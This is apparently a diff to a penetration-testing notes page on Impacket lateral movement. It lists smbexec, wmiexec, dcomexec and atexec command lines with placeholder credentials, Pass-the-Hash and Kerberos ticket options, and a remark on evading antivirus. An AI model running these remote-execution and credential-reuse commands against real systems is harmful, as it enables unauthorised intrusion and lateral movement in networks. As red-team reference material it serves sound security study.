@@ -43,3 +43,30 @@ Linux:
 ```bash
 $ impacket-smbexec ADMIN_USER@TARGET
 ```
+
+> [!Note]
+> `smbexec.py` creates a semi-interactive shell and, unlike `psexec.py`, does **not** drop a binary on disk (it uses services + SMB output redirection), which makes it stealthier against AV.
+
+# WMIexec / DCOMexec / ATexec
+
+Other Impacket execution methods that avoid creating a service (useful when PsExec is flagged):
+```bash
+$ wmiexec.py DOMAIN_FQDN/ADMIN_USER:'PASSWORD'@TARGET      # execution via WMI (see [[WMI]])
+$ dcomexec.py DOMAIN_FQDN/ADMIN_USER:'PASSWORD'@TARGET     # execution via DCOM (MMC20, ShellWindows...)
+$ atexec.py DOMAIN_FQDN/ADMIN_USER:'PASSWORD'@TARGET whoami # execution via the Task Scheduler
+```
+
+# Authentication Options
+
+Impacket tools accept the same authentication flags across the whole suite:
+```bash
+# Pass the Hash (see [[Pass the Hash (PtH)]])
+$ impacket-psexec -hashes :NTLM_HASH ADMIN_USER@TARGET
+
+# Pass the Ticket / Kerberos auth (see [[Pass the Ticket (PtT)]])
+$ export KRB5CCNAME=ticket.ccache
+$ impacket-psexec -k -no-pass DOMAIN_FQDN/ADMIN_USER@TARGET.DOMAIN_FQDN
+```
+
+> [!Tip]
+> Related lateral movement techniques in this vault: [[Pass the Hash (PtH)]], [[Pass the Ticket (PtT)]], [[WMI]], [[WinRM]] and [[RDP]].
